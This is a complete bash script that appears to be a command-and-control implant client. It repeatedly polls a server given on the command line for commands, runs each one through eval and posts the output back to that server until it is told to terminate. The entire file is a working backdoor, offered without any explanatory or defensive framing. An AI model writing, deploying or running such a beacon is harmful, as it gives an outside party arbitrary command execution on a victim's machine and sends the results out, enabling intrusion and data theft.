#!/bin/bash
C2_URL="$1"
CLIENT_ID="$2"
if [[ -z "$C2_URL" || -z "$CLIENT_ID" ]]; then
    echo "[!] Usage: $0 <C2_URL> <CLIENT_ID>"
    exit 1
fi
while true; do
    response=$(curl -s -w "%{http_code}" -o /tmp/response_body "$C2_URL/command/$CLIENT_ID")
    http_code=$(echo "$response" | tail -n1)
    command=$(cat /tmp/response_body)
    if [[ "$http_code" -eq 200 && -n "$command" ]]; then
        if [[ "$command" == *"terminate"* ]]; then
            break
        fi
        output=$(eval "$command" 2>&1)
        encoded_output=$(echo "$output" | jq -Rs .)
        curl -s -X POST -H "Content-Type: application/json" -d "{\"output\": $encoded_output}" "$C2_URL/command/$CLIENT_ID"
    elif [[ "$http_code" -eq 000 ]]; then
        echo "[ERROR] Network or connection error. Retrying..."
        sleep 5
    fi
    sleep 5
done